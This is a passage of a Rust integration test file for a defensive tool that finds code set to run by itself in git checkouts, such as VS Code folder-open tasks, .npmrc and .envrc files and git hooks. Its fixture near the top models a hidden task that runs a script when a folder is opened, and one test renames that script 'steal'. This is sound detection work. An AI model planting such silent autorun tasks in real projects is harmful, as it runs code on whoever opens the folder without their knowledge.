//! Promises of what runs by itself in a checkout and of indicators. Every test runs the real
//! binary on an invented estate under a temporary folder: checkouts with an editor's task
//! file and lockfiles, and a list of indicators next to the store. Nothing real is read.

mod common;

use immunity_contract::v1;
use prost::Message;
use rusqlite::Connection;
use std::path::{Path, PathBuf};
use std::process::Command;
use std::time::{SystemTime, UNIX_EPOCH};

const TASKS_KIND: &str = "editor tasks set to run when a checkout's folder is opened";
const PNPM_KIND: &str =
    ".pnpmfile.cjs, .pnpmfile.mjs of each checkout, the part that runs by itself";
const OTHERS_KIND: &str = "other ways a checkout runs code by itself";
const PRESENT_KIND: &str = "ways a checkout runs code by itself, as present in each";
const LIST_KIND: &str = "indicator list given as a file";
const UNMATCHED_KIND: &str = "indicators against what this build does not match them with";
const AUTOSTART_KIND: &str = "launch agents and daemons";
/// The rule of the item that tells the places read for the first time.
const FIRST_READ: &str = "watched.first-read";

/// A task file as an editor writes it, with a task set to run when the folder is opened.
const ON_OPEN: &str = r#"{
    // See https://go.microsoft.com/fwlink/?LinkId=733558
    "version": "2.0.0",
    "tasks": [
        {
            "label": "install",
            "type": "shell",
            "command": "node .vscode/setup.js",
            "presentation": { "reveal": "never" },
            "runOptions": { "runOn": "folderOpen" }, /* runs on opening */
        },
    ]
}
"#;

/// A task file with a task that runs only when asked.
const ON_ASK: &str = r#"{
    // build
    "version": "2.0.0",
    "tasks": [{ "label": "build", "type": "shell", "command": "make", }]
}
"#;

const LOCK: &str = r#"{
  "name": "shop",
  "lockfileVersion": 3,
  "packages": {
    "": { "name": "shop" },
    "node_modules/left-pad": {
      "version": "1.3.0",
      "resolved": "https://registry.npmjs.org/left-pad/-/left-pad-1.3.0.tgz"
    }
  }
}
"#;

struct Estate(PathBuf);

impl Estate {
    fn new(tag: &str) -> Estate {
        let nanos = SystemTime::now()
            .duration_since(UNIX_EPOCH)
            .unwrap()
            .as_nanos();
        let path = std::env::temp_dir().join(format!(
            "immunity-runs-{tag}-{}-{nanos}",
            std::process::id()
        ));
        for dir in ["home", "system", "empty"] {
            std::fs::create_dir_all(path.join(dir)).unwrap();
        }
        std::fs::write(path.join("brew.json"), "{\"formulae\": [], \"casks\": []}").unwrap();
        Estate(path)
    }

    fn home(&self) -> PathBuf {
        self.0.join("home")
    }

    fn store(&self) -> PathBuf {
        self.0.join("store.db")
    }

    /// A checkout as git leaves it, under the home folder.
    fn checkout(&self, rel: &str) -> PathBuf {
        let path = self.home().join(rel);
        put(&path.join(".git/HEAD"), "ref: refs/heads/main\n");
        path
    }

    /// The list of indicators next to the store, where it is read from by default.
    fn list(&self, entries: &str) {
        std::fs::write(self.0.join("indicators.json"), entries).unwrap();
    }

    fn run(&self) -> String {
        self.run_in(&self.home())
    }

    /// A run whose walk for checkouts is pointed at `root`.
    fn run_in(&self, root: &Path) -> String {
        self.run_with(root, &self.0.join("empty"))
    }

    /// A run whose walk is pointed at `root` and whose agents' sessions are in `sessions`.
    fn run_with(&self, root: &Path, sessions: &Path) -> String {
        self.go(Some(root), sessions)
    }

    /// A full run, as `immunity run` makes it by default: the walk of the whole home folder.
    fn full(&self) -> String {
        self.go(None, &self.0.join("empty"))
    }

    /// A run, and its line as the journal keeps it and the page of changes shows it for each
    /// run. What a person reads after a run is told from the status (`after_run.rs`).
    fn go(&self, root: Option<&Path>, sessions: &Path) -> String {
        let out = self.command(root, sessions).output().unwrap();
        assert!(
            out.status.success(),
            "{}",
            String::from_utf8_lossy(&out.stderr)
        );
        self.rows("SELECT text FROM journal WHERE entry = 'report' ORDER BY seq DESC LIMIT 1")
            .concat()
    }

    /// The command of a run, not started.
    fn command(&self, root: Option<&Path>, sessions: &Path) -> Command {
        self.command_as("mac", root, sessions)
    }

    /// The command of a run on a machine named `machine`, not started.
    fn command_as(&self, machine: &str, root: Option<&Path>, sessions: &Path) -> Command {
        let empty = self.0.join("empty");
        let mut cmd = Command::new(env!("CARGO_BIN_EXE_immunity"));
        cmd.env("HOME", self.home())
            .env("PATH", "/usr/bin:/bin")
            .current_dir(&self.0)
            .args(["run", "--machine-name", machine, "--store"])
            .arg(self.store())
            .arg("--system-root")
            .arg(self.0.join("system"))
            .arg("--brew-input")
            .arg(self.0.join("brew.json"))
            .args(["--tailscale", "none", "--threats-input", "none"])
            .args(["--osv-crates-input", "none", "--osv-npm-input", "none"])
            .arg("--sessions-root")
            .arg(sessions)
            .arg("--servers-input")
            .arg(&empty);
        if let Some(root) = root {
            cmd.arg("--checkouts-root").arg(root);
        }
        cmd
    }

    fn rows(&self, sql: &str) -> Vec<String> {
        let db = Connection::open(self.store()).unwrap();
        let mut stmt = db.prepare(sql).unwrap();
        let n = stmt.column_count();
        stmt.query_map([], |r| {
            Ok((0..n)
                .map(|i| r.get::<_, Option<String>>(i).unwrap().unwrap_or_default())
                .collect::<Vec<_>>()
                .join("|"))
        })
        .unwrap()
        .collect::<rusqlite::Result<_>>()
        .unwrap()
    }

    /// The latest reading of a kind on this machine, as completeness and reason.
    fn coverage(&self, kind: &str) -> String {
        self.rows(&format!(
            "SELECT completeness, reason FROM coverage WHERE scope = 'machine:mac'
               AND kind = '{}' ORDER BY id DESC LIMIT 1",
            kind.replace('\'', "''")
        ))
        .concat()
    }

    /// What the latest reading of a kind names as having no reader, as what and name.
    fn lacks(&self, kind: &str) -> Vec<String> {
        self.rows(&format!(
            "SELECT what, name FROM coverage_lack WHERE coverage =
               (SELECT MAX(id) FROM coverage WHERE kind = '{}') ORDER BY name",
            kind.replace('\'', "''")
        ))
    }

    /// Findings, open ones unless `all`, as rule, state, where and value.
    fn findings(&self, all: bool) -> Vec<(String, String, String, String)> {
        let s = |v: &serde_json::Value| v.as_str().unwrap_or_default().to_string();
        self.contract(&["findings"])["findings"]
            .as_array()
            .unwrap()
            .iter()
            .filter(|f| all || f["finding"]["state"] == "open")
            .map(|f| {
                let one = self.contract(&["finding", f["finding"]["id"].as_str().unwrap()]);
                (
                    s(&f["finding"]["rule"]),
                    s(&f["finding"]["state"]),
                    s(&f["where_text"]),
                    s(&one["evidence"]["indicator_matched"]["indicators_text"]),
                )
            })
            .collect()
    }

    /// `immunity <args> --json --store <this store>`, as the contract's message.
    fn contract(&self, args: &[&str]) -> serde_json::Value {
        let out = Command::new(env!("CARGO_BIN_EXE_immunity"))
            .args(args)
            .args(["--json", "--store"])
            .arg(self.store())
            .output()
            .unwrap();
        assert!(out.status.success());
        serde_json::from_slice(&out.stdout).unwrap()
    }

    fn rules(&self) -> Vec<String> {
        self.findings(false).into_iter().map(|f| f.0).collect()
    }

    /// `immunity status --json`'s result.
    fn status(&self) -> serde_json::Value {
        let out = Command::new(env!("CARGO_BIN_EXE_immunity"))
            .args(["status", "--json", "--store"])
            .arg(self.store())
            .output()
            .unwrap();
        serde_json::from_slice::<serde_json::Value>(&out.stdout)
            .unwrap()
            .clone()
    }

    /// The page of what is watched on this Mac.
    fn this_mac_page(&self) -> String {
        self.page("this-mac.html")
    }

    /// One page `immunity view` makes, by its file name.
    fn page(&self, name: &str) -> String {
        let out = Command::new(env!("CARGO_BIN_EXE_immunity"))
            .args(["view", "--no-open", "--store"])
            .arg(self.store())
            .output()
            .unwrap();
        assert!(out.status.success());
        let pages = String::from_utf8(out.stdout).unwrap();
        let path = pages
            .lines()
            .find(|p| p.ends_with(&format!("/{name}")))
            .unwrap()
            .to_string();
        std::fs::read_to_string(path).unwrap()
    }

    /// The open findings as rule and where, sorted.
    fn found(&self) -> Vec<(String, String)> {
        let mut found: Vec<(String, String)> = self
            .findings(false)
            .into_iter()
            .map(|f| (f.0, f.2))
            .collect();
        found.sort();
        found
    }

    /// The places the open items of places read for the first time name, oldest check first,
    /// each as its id with how many things it held; empty when there is none.
    fn told(&self) -> Vec<String> {
        let listed = self.contract(&["findings"]);
        let mut ids: Vec<String> = listed["findings"]
            .as_array()
            .unwrap()
            .iter()
            .filter(|f| f["finding"]["rule"] == FIRST_READ && f["finding"]["state"] == "open")
            .map(|f| f["finding"]["id"].as_str().unwrap().to_string())
            .collect();
        ids.reverse();
        let mut out = Vec::new();
        for id in ids {
            let one = self.contract(&["finding", &id]);
            out.extend(
                one["rests_on"]
                    .as_array()
                    .unwrap()
                    .iter()
                    .filter(|j| j["entry"] == "place_first_read")
                    .map(|j| {
                        format!(
                            "{} ({})",
                            j["subject_text"].as_str().unwrap(),
                            j["new_value_text"].as_str().unwrap()
                        )
                    }),
            );
        }
        out
    }

    /// How many differences the journal marks as found where nobody could have known, after
    /// the journal entry `after`.
    fn silent_after(&self, after: i64) -> i64 {
        self.rows(&format!(
            "SELECT CAST(COUNT(*) AS TEXT) FROM journal
             WHERE text = 'first reading of its place' AND seq > {after}"
        ))[0]
            .parse()
            .unwrap()
    }

    /// The last journal entry so far.
    fn last_entry(&self) -> i64 {
        self.rows("SELECT CAST(MAX(seq) AS TEXT) FROM journal")[0]
            .parse()
            .unwrap()
    }

    /// The owner says he has seen every open finding.
    fn seen(&self) {
        let listed = self.contract(&["findings"]);
        let open = listed["findings"]
            .as_array()
            .unwrap()
            .iter()
            .filter(|f| f["finding"]["state"] == "open");
        for f in open {
            let out = Command::new(env!("CARGO_BIN_EXE_immunity"))
                .args([
                    "finding",
                    f["finding"]["id"].as_str().unwrap(),
                    "seen",
                    "--store",
                ])
                .arg(self.store())
                .output()
                .unwrap();
            assert!(out.status.success());
        }
        assert!(self.rules().is_empty());
    }
}

impl Drop for Estate {
    fn drop(&mut self) {
        common::remove(&self.0);
    }
}

fn link(target: &str, at: &Path) {
    std::fs::create_dir_all(at.parent().unwrap()).unwrap();
    std::os::unix::fs::symlink(target, at).unwrap();
}

fn put(path: &Path, content: &str) {
    std::fs::create_dir_all(path.parent().unwrap()).unwrap();
    std::fs::write(path, content).unwrap();
}

// What runs by itself.

#[test]
fn a_task_set_to_run_on_opening_is_found_in_a_checkout_that_arrives_after_the_baseline() {
    // The first reading on this Mac is the baseline: a task already there is not news. A
    // checkout cloned later with such a task is the incident's way in, so it is found, though
    // the checkout itself is new.
    let e = Estate::new("arrives");
    let old = e.checkout("dev/old");
    put(&old.join(".vscode/tasks.json"), ON_OPEN);
    e.run();
    assert_eq!(e.coverage(TASKS_KIND), "full|");
    assert!(e.rules().is_empty(), "{:?}", e.findings(false));
    let new = e.checkout("dev/new");
    put(&new.join(".vscode/tasks.json"), ON_OPEN);
    e.run();
    let found = e.findings(false);
    assert_eq!(found.len(), 1, "{found:?}");
    assert_eq!(found[0].0, "autorun.folder-open");
    assert_eq!(found[0].2, "~/dev/new/.vscode/tasks.json");
    // Its file changes after the owner has seen it: found again.
    e.seen();
    put(
        &new.join(".vscode/tasks.json"),
        &ON_OPEN.replace("setup", "steal"),
    );
    e.run();
    assert_eq!(e.rules(), ["autorun.folder-open"]);
}

#[test]
fn a_task_file_with_no_such_task_is_not_watched_until_one_is_added() {
    let e = Estate::new("added");
    let shop = e.checkout("dev/shop");
    let tasks = shop.join(".vscode/tasks.json");
    put(&tasks, ON_ASK);
    e.run();
    assert_eq!(
        e.coverage(TASKS_KIND),
        "full|no checkout has an editor task set to run when its folder is opened"
    );
    // Edited, still with no task set to run on opening: nothing to say.
    put(&tasks, &ON_ASK.replace("make", "make all"));
    e.run();
    assert!(e.rules().is_empty());
    put(&tasks, ON_OPEN);
    e.run();
    assert_eq!(e.rules(), ["autorun.folder-open"]);
    // Taken out again: the file leaves the watched ones, and that is nothing to find.
    e.seen();
    put(&tasks, ON_ASK);
    e.run();
    assert!(e.rules().is_empty());
    assert!(
        e.rows(
            "SELECT subject FROM assertion WHERE layer = 'live' AND predicate = 'watched_as'
                 AND object = 'task run when the project folder is opened'"
        )
        .is_empty()
    );
}

#[test]
fn a_task_file_that_cannot_be_read_as_json_with_comments_is_a_failed_reading_never_no_task() {
    let e = Estate::new("unparsed");
    let shop = e.checkout("dev/shop");
    put(
        &shop.join(".vscode/tasks.json"),
        "{ \"tasks\": [ { \"label\": } ] }",
    );
    e.run();
    let coverage = e.coverage(TASKS_KIND);
    assert!(
        coverage.starts_with("none|could not be read: dev/shop/.vscode/tasks.json (")
            && coverage.contains("line 1"),
        "{coverage}"
    );
}

#[test]
fn a_task_file_that_is_not_a_regular_file_or_is_too_large_is_a_failed_reading() {
    let e = Estate::new("not-regular");
    std::fs::create_dir_all(e.checkout("dev/a").join(".vscode/tasks.json")).unwrap();
    let big = format!("{{\"tasks\": []}}{}", " ".repeat(1024 * 1024));
    put(&e.checkout("dev/b").join(".vscode/tasks.json"), &big);
    e.run();
    assert_eq!(
        e.coverage(TASKS_KIND),
        "none|could not be read: dev/a/.vscode/tasks.json (not a regular file); dev/b/.vscode/tasks.json (over the size cap of 1024 KiB)"
    );
}

#[test]
fn other_ways_a_project_runs_code_by_itself_are_named_where_they_are_present() {
    // They are not read, so what they would run is not known: the report says so by name,
    // with how many checkouts hold each, and says nothing of what is not there, nor of what
    // is read. A file under a worktree's `.git`, which is a file, is not there.
    let e = Estate::new("others");
    for rel in ["dev/a", "dev/b"] {
        let c = e.checkout(rel);
        put(&c.join(".npmrc"), "ignore-scripts=false\n");
        put(&c.join("package.json"), "{\"scripts\": {}}");
    }
    put(&e.checkout("dev/c").join(".envrc"), "use flake\n");
    put(
        &e.home().join("dev/tree/.git"),
        "gitdir: /invented/.git/worktrees/tree\n",
    );
    e.run();
    assert_eq!(
        e.coverage(OTHERS_KIND),
        "none|not read: .envrc in 1 checkout; .npmrc in 2 checkouts"
    );
    assert_eq!(
        e.lacks(OTHERS_KIND),
        [
            "way a project runs code by itself|.envrc",
            "way a project runs code by itself|.npmrc"
        ]
    );
    for c in ["dev/a", "dev/b", "dev/c"] {
        std::fs::remove_dir_all(e.home().join(c)).unwrap();
    }
    // Only a walk of the whole home folder finds that projects are gone.
    e.full();
    assert_eq!(e.coverage(OTHERS_KIND), "full|");
    assert!(e.lacks(OTHERS_KIND).is_empty());
}

#[test]
fn a_way_not_read_with_two_names_is_named_as_two_names_in_the_report_and_the_status() {
    // The way of Gemini CLI has two files. Each is a name of its own wherever the way is told,
    // never the two joined into one name with its comma escaped.
    let e = Estate::new("two-names");
    put(&e.checkout("dev/shop").join(".env"), "KEY=invented\n");
    // With Vim's way, of three files, there are five names: every one is given, not a first
    // three that would leave a way out unsaid.
    put(&e.checkout("dev/cli").join(".nvimrc"), "set number\n");
    let out = e
        .command(Some(&e.home()), &e.0.join("empty"))
        .output()
        .unwrap();
    assert!(out.status.success());
    let report = String::from_utf8(out.stdout).unwrap();
    assert!(report.contains(".env, .gemini/.env"), "{report}");
    let status = e.status();
    let u = status["not_covered"]
        .as_array()
        .unwrap()
        .iter()
        .find(|u| u["id"] == "project-autorun")
        .unwrap();
    assert_eq!(
        u["examples_text"],
        serde_json::json!([".env", ".gemini/.env", ".nvim.lua", ".nvimrc", ".exrc"])
    );
    assert_eq!(u["count"], 2);
    let text = |args: &[&str]| {
        let out = Command::new(env!("CARGO_BIN_EXE_immunity"))
            .args(args)
            .arg("--store")
            .arg(e.store())
            .output()
            .unwrap();
        String::from_utf8(out.stdout).unwrap()
    };
    let coverage = text(&["status", "--coverage"]);
    assert!(
        coverage.contains("\".env\"; \".gemini/.env\""),
        "{coverage}"
    );
    let listed = text(&["status"]);
    for said in [&report, &coverage, &listed] {
        assert!(!said.contains("\\u{"), "{said}");
    }
}

/// What `immunity project` answers of a project here: the ways it holds, and the presence reading
/// and the reading of ways not read, each as completeness, cause and reason.
fn ways_held(e: &Estate, rel: &str) -> (Vec<String>, [String; 2]) {
    let known = e.contract(&["project", &format!("checkout:machine:mac/{rel}")]);
    let text = |v: &serde_json::Value| v.as_str().unwrap_or_default().to_string();
    let ways = known["facts"].as_array().unwrap().iter();
    let ways = ways
        .filter(|f| f["predicate"] == "holds_autorun_point")
        .map(|f| text(&f["object_text"]))
        .collect();
    let reading = |kind: &str| {
        let mut all = known["coverage"].as_array().unwrap().iter();
        let c = all.find(|c| c["kind"] == kind).unwrap();
        [&c["completeness"], &c["cause"], &c["reason_text"]]
            .map(text)
            .join("|")
    };
    (ways, [reading(PRESENT_KIND), reading(OTHERS_KIND)])
}

#[test]
fn a_project_a_run_did_not_look_into_keeps_the_ways_it_holds_and_the_readings_say_why() {
    let e = Estate::new("ways-skipped");
    let shop = e.checkout("dev/shop");
    e.checkout("work/cli");
    put(&shop.join(".npmrc"), "ignore-scripts=false\n");
    e.run();
    let not_read = "none|no_reader|not read: .npmrc in 1 checkout".to_string();
    let held = |present: &str| {
        (
            vec![".npmrc".to_string()],
            [present.to_string(), not_read.clone()],
        )
    };
    assert_eq!(ways_held(&e, "dev/shop"), held("full||"));
    for (root, why) in [
        (
            "missing",
            "failed|the checkout walk could not open its root folder",
        ),
        ("work", "not_given|known checkouts were not looked into"),
    ] {
        e.run_in(&e.home().join(root));
        assert_eq!(
            ways_held(&e, "dev/shop"),
            held(&format!("partial|{why}")),
            "{root}"
        );
    }
    let removed = "SELECT subject FROM journal WHERE entry = 'removed'
                     AND predicate = 'holds_autorun_point'";
    assert!(e.rows(removed).is_empty());
    std::fs::remove_file(shop.join(".npmrc")).unwrap();
    e.run();
    let whole = || ["full||".to_string(), "full||".to_string()];
    assert_eq!(ways_held(&e, "dev/shop"), (Vec::new(), whole()));
    assert_eq!(e.rows(removed), ["checkout:machine:mac/dev/shop"]);
}

#[test]
fn a_reading_that_was_not_read_is_said_once_with_its_reason() {
    let e = Estate::new("ways-said-once");
    let shop = e.checkout("dev/shop");
    put(&shop.join(".npmrc"), "ignore-scripts=false\n");
    e.run();
    let out = Command::new(env!("CARGO_BIN_EXE_immunity"))
        .args(["project", "checkout:machine:mac/dev/shop", "--store"])
        .arg(e.store())
        .output()
        .unwrap();
    assert!(out.status.success());
    let text = String::from_utf8(out.stdout).unwrap();
    let line = text.lines().find(|l| l.contains(OTHERS_KIND)).unwrap();
    assert!(
        line.contains(&format!(
            "{OTHERS_KIND} on mac: not read: .npmrc in 1 checkout;"
        )),
        "{line}"
    );
    assert_eq!(line.matches("not read").count(), 1, "{line}");
}

const CHECKOUTS_KIND: &str = "checkouts under the home folder";

/// What `immunity project` says of a project here: held, gone or unknown.
fn presence(e: &Estate, rel: &str) -> String {
    let known = e.contract(&["project", &format!("checkout:machine:mac/{rel}")]);
    known["presence"].as_str().unwrap().to_string()
}

/// The journal's removals of projects, by id, sorted.
fn projects_removed(e: &Estate) -> Vec<String> {
    e.rows(
        "SELECT subject FROM journal WHERE entry = 'removed' AND predicate = 'located_on'
           AND subject LIKE 'checkout:%' ORDER BY subject",
    )
}

/// The cause the latest reading of checkouts gives.
fn checkouts_cause(e: &Estate) -> String {
    e.rows(&format!(
        "SELECT cause FROM coverage WHERE scope = 'machine:mac' AND kind = '{CHECKOUTS_KIND}'
           ORDER BY id DESC LIMIT 1"
    ))
    .concat()
}

#[test]
fn known_projects_the_home_walk_does_not_reach_are_kept_unread_while_there_and_closed_when_gone() {
    // Each was found by a run pointed nearer: six folders down, past the walk's depth; in a
    // hidden folder the walk passes by. None may be said gone by the next whole run, nor what
    // one holds be said absent from projects. The whole run reads nothing in them: a run
    // pointed there does.
    let e = Estate::new("deep-known");
    e.checkout("dev/shop");
    let rel = "src/clients/acme/apps/web/frontend";
    let deep = e.checkout(rel);
    put(&deep.join(".npmrc"), "ignore-scripts=false\n");
    let hidden = e.checkout("dev/.tool");
    e.full();
    for root in [e.home().join("src"), hidden.clone()] {
        e.run_in(&root);
    }
    assert_eq!(ways_held(&e, rel).0, [".npmrc"]);
    put(&deep.join("package-lock.json"), LOCK);
    e.full();
    assert!(part_of(&e, "left-pad").is_empty());
    assert_eq!(ways_held(&e, rel).0, [".npmrc"]);
    assert_eq!(presence(&e, rel), "held");
    assert_eq!(presence(&e, "dev/.tool"), "held");
    assert!(projects_removed(&e).is_empty());
    assert!(
        e.rows(
            "SELECT 1 FROM journal WHERE entry = 'removed' AND predicate = 'holds_autorun_point'"
        )
        .is_empty()
    );
    assert_eq!(e.coverage(CHECKOUTS_KIND), "full|");
    assert_eq!(
        ways_meaning(&e),
        format!("{ONE_NOT_READ} {NOT_EVERY} Why: known checkouts were not looked into.")
    );
    e.run_in(&e.home().join("src"));
    assert_eq!(
        part_of(&e, "left-pad"),
        [format!("checkout:machine:mac/{rel}")]
    );

    for c in [&deep, &hidden] {
        std::fs::remove_dir_all(c).unwrap();
    }
    e.full();
    e.full();
    assert_eq!(presence(&e, rel), "gone");
    assert_eq!(
        projects_removed(&e),
        [
            "checkout:machine:mac/dev/.tool".to_string(),
            format!("checkout:machine:mac/{rel}"),
        ]
    );
    assert_eq!(e.coverage(CHECKOUTS_KIND), "full|");
}

#[test]
fn a_known_project_outside_the_home_folder_is_kept_unread_by_a_whole_walk_and_read_where_pointed() {
    // Found by a run given a folder outside the home folder. A whole walk looks again only
    // under its own root: it keeps the project as it was and reads nothing added to it. A run
    // pointed at the folder reads it, and closes it once it is deleted.
    let e = Estate::new("outside-known");
    e.checkout("dev/shop");
    let app = e.0.join("elsewhere/app");
    put(&app.join(".git/HEAD"), "ref: refs/heads/main\n");
    e.run_in(&e.0.join("elsewhere"));
    put(&app.join("package-lock.json"), LOCK);
    e.full();
    // The id names the real folder; the test makes it real only to spell it.
    let real = std::fs::canonicalize(&app).unwrap().display().to_string();
    let id = format!("checkout:machine:mac/{real}");
    assert!(part_of(&e, "left-pad").is_empty());
    assert_eq!(presence(&e, &real), "held");
    assert_eq!(e.coverage(CHECKOUTS_KIND), "full|");
    e.run_in(&e.0.join("elsewhere"));
    assert_eq!(part_of(&e, "left-pad"), [id.as_str()]);
    std::fs::remove_dir_all(&app).unwrap();
    e.run_in(&e.0.join("elsewhere"));
    assert_eq!(projects_removed(&e), [id]);
}

/// The projects a package is live in, by id.
fn part_of(e: &Estate, package: &str) -> Vec<String> {
    e.rows(&format!(
        "SELECT object FROM assertion WHERE layer = 'live' AND predicate = 'part_of'
           AND subject LIKE '%{package}%'"
    ))
}

/// The projects held, by id, sorted.
fn projects_held(e: &Estate) -> Vec<String> {
    e.rows(
        "SELECT subject FROM assertion WHERE layer = 'live' AND predicate = 'located_on'
           AND reader = 'checkouts' ORDER BY subject",
    )
}

#[test]
fn a_run_given_a_folder_through_a_link_or_a_parent_folder_names_its_projects_by_the_real_one() {
    let e = Estate::new("given-real");
    e.checkout("dev/shop");
    link(
        e.home().join("dev").to_str().unwrap(),
        &e.home().join("work"),
    );
    e.run_in(&e.home().join("work"));
    assert_eq!(projects_held(&e), ["checkout:machine:mac/dev/shop"]);
    e.run_in(&e.home().join("dev/../dev"));
    assert_eq!(projects_held(&e), ["checkout:machine:mac/dev/shop"]);
    e.full();
    assert_eq!(projects_held(&e), ["checkout:machine:mac/dev/shop"]);
    assert!(projects_removed(&e).is_empty());
}

#[test]
fn a_run_given_a_link_into_documents_holds_the_project_there_and_a_whole_walk_keeps_it_unentered() {
    let e = Estate::new("given-into-documents");
    e.checkout("Documents/src/shop");
    let docs = e.home().join("Documents");
    link(docs.join("src").to_str().unwrap(), &e.home().join("code"));
    e.run_in(&e.home().join("code"));
    assert_eq!(
        projects_held(&e),
        ["checkout:machine:mac/Documents/src/shop"]
    );
    // Shut, as macOS keeps it from a program it did not let in.
    mode(&docs, 0o000);
    e.full();
    mode(&docs, 0o755);
    assert_eq!(presence(&e, "Documents/src/shop"), "held");
    assert_eq!(e.coverage(CHECKOUTS_KIND), "full|");
    assert_eq!(
        e.rows(
            "SELECT completeness || '|' || reason FROM coverage WHERE reader = 'checkouts'
               AND kind = 'folders macOS asks permission for' ORDER BY id DESC LIMIT 1"
        ),
        ["none|not looked into: ~/Documents"]
    );
}

#[test]
fn a_walk_given_a_folder_closes_the_known_projects_gone_from_it_and_none_outside_it() {
    // In Documents, which only a walk given it enters.
    let e = Estate::new("given-closes");
    let shop = e.checkout("Documents/src/shop");
    let hidden = e.checkout("Documents/src/.cache/tool");
    let outside = e.checkout("dev/old");
    e.full();
    // The walk does not enter a hidden folder: a run pointed there found the project.
    let given = e.home().join("Documents/src");
    e.run_in(&given.join(".cache"));
    e.run_in(&given);
    assert_eq!(presence(&e, "Documents/src/.cache/tool"), "held");
    for c in [&shop, &hidden, &outside] {
        std::fs::remove_dir_all(c).unwrap();
    }
    e.run_in(&given);
    assert_eq!(
        projects_removed(&e),
        [
            "checkout:machine:mac/Documents/src/.cache/tool",
            "checkout:machine:mac/Documents/src/shop"
        ]
    );
    assert_eq!(presence(&e, "dev/old"), "held");
    assert_eq!(
        e.coverage(CHECKOUTS_KIND),
        "partial|only the given folder was walked"
    );
}

#[test]
fn a_known_project_in_a_folder_macos_protects_is_kept_and_the_folder_named_without_entering_it() {
    let e = Estate::new("known-guarded");
    e.checkout("dev/shop");
    for rel in [
        "Library/CloudStorage/a/app",
        "Library/CloudStorage/b/app",
        "work/app",
    ] {
        e.checkout(rel);
    }
    e.full();
    e.run_in(&e.home().join("Library/CloudStorage"));
    // One project moves into Documents, and a link takes the place of a folder on its way:
    // that path is no longer there, so the project is closed.
    let docs = e.home().join("Documents");
    std::fs::create_dir_all(&docs).unwrap();
    std::fs::rename(e.home().join("work"), docs.join("work")).unwrap();
    link(docs.join("work").to_str().unwrap(), &e.home().join("work"));
    // Shut, as macOS keeps it from a program it did not let in.
    mode(&docs, 0o000);
    e.full();
    mode(&docs, 0o755);
    assert_eq!(e.coverage(CHECKOUTS_KIND), "full|");
    assert_eq!(
        e.rows(
            "SELECT completeness || '|' || reason FROM coverage WHERE reader = 'checkouts'
               AND kind = 'folders macOS asks permission for' ORDER BY id DESC LIMIT 1"
        ),
        ["none|not looked into: ~/Documents, ~/Library/CloudStorage"]
    );
    assert_eq!(projects_removed(&e), ["checkout:machine:mac/work/app"]);
}

#[test]
fn a_project_whose_folder_or_one_above_it_was_renamed_in_case_only_is_held_under_one_name() {
    // The Mac's volumes ignore case by default: looked at by its old name a folder is still
    // there. Where the walk met it under the disk's name it is held under that name alone;
    // where the walk does not reach it, as in a hidden folder, it stays held under the name it
    // has, and is not read. On a volume that honours case the old name is simply not there and
    // nothing is pinned, so the test first looks a file up in the other case and stops if it
    // is not found.
    let e = Estate::new("renamed-case");
    put(&e.0.join("case"), "");
    if !e.0.join("CASE").exists() {
        return;
    }
    e.checkout("Shop");
    e.checkout("Dev/app");
    e.checkout(".Work/proj");
    e.full();
    e.run_in(&e.home().join(".Work"));
    for (from, to) in [("Shop", "shop"), ("Dev", "dev"), (".Work", ".work")] {
        std::fs::rename(e.home().join(from), e.home().join(to)).unwrap();
    }
    put(&e.home().join(".work/proj/package-lock.json"), LOCK);
    e.full();
    assert_eq!(
        projects_removed(&e),
        ["checkout:machine:mac/Dev/app", "checkout:machine:mac/Shop"]
    );
    assert_eq!(presence(&e, "shop"), "held");
    assert_eq!(presence(&e, "dev/app"), "held");
    assert_eq!(presence(&e, ".Work/proj"), "held");
    assert!(part_of(&e, "left-pad").is_empty());
}

#[test]
fn a_known_project_that_cannot_be_looked_at_is_kept_and_the_reading_says_why_until_it_can() {
    // A hidden folder the walk never enters; a run pointed there found the projects. One is
    // in a folder that cannot be searched, the other's own folder cannot be.
    let e = Estate::new("cannot-tell");
    e.checkout("dev/shop");
    let rel = ".work/locked/proj";
    e.checkout(rel);
    e.checkout(".work/shut");
    e.run_in(&e.home().join(".work"));
    let shut = [e.home().join(".work/locked"), e.home().join(".work/shut")];
    for folder in &shut {
        mode(folder, 0o000);
    }
    e.full();
    for folder in &shut {
        mode(folder, 0o755);
    }
    assert_eq!(
        e.coverage(CHECKOUTS_KIND),
        format!(
            "partial|known checkouts that could not be looked at, kept as they were: {rel}, .work/shut"
        )
    );
    assert_eq!(checkouts_cause(&e), "failed");
    assert_eq!(presence(&e, rel), "held");
    e.full();
    assert_eq!(e.coverage(CHECKOUTS_KIND), "full|");
    assert_eq!(presence(&e, rel), "held");
    assert!(projects_removed(&e).is_empty());
}

#[test]
fn a_walk_whose_folder_is_not_one_writes_a_failed_reading_and_the_next_whole_walk_is_full() {
    let e = Estate::new("root-not-folder");
    e.checkout("dev/shop");
    e.full();
    let missing = e.home().join("missing");
    e.run_in(&missing);
    assert_eq!(
        e.coverage(CHECKOUTS_KIND),
        format!(
            "none|could not look for checkouts in {}: not a folder",
            missing.display()
        )
    );
    assert_eq!(checkouts_cause(&e), "failed");
    assert_eq!(presence(&e, "dev/shop"), "held");
    e.full();
    assert_eq!(e.coverage(CHECKOUTS_KIND), "full|");
}

/// The known project `dev/shop`, its hooks read, after a link took the place of the folder
/// `replaced` and a whole walk. The link points to a folder outside the home folder; to one
/// in `~/Library/CloudStorage` named through another case of the home folder's own name,
/// which macOS would not take for the protected folder; and, with `in_home`, to `~/Projects`,
/// which the walk reads. There is a project with a package the store does not know. The
/// protected folders' reading is unchanged by the walk, the walk's reading is full, and
/// nothing names the package but the project under `~/Projects`. Then `then` is called.
fn after_a_link_took_the_place_of(replaced: &str, in_home: bool, then: impl Fn(&Estate)) {
    for target in ["elsewhere", "cloud", "home"]
        .iter()
        .take(2 + usize::from(in_home))
    {
        let e = Estate::new("link-on-the-way");
        let shop = e.checkout("dev/shop");
        put(&shop.join(".git/hooks/pre-commit"), "#!/bin/sh\nexit 0\n");
        e.full();
        let guarded = || {
            e.rows(
                "SELECT completeness || '|' || coalesce(reason, '') FROM coverage
                   WHERE reader = 'checkouts' AND kind = 'folders macOS asks permission for'
                   ORDER BY id DESC LIMIT 1",
            )
        };
        let before = guarded();
        let (real, spelled) = match *target {
            "cloud" => {
                let rest = "Library/CloudStorage/x";
                (e.home().join(rest), e.0.join("HOME").join(rest))
            }
            "home" => (e.home().join("Projects"), e.home().join("Projects")),
            _ => (e.0.join("elsewhere"), e.0.join("elsewhere")),
        };
        let there = real.join(Path::new("dev/shop").strip_prefix(replaced).unwrap());
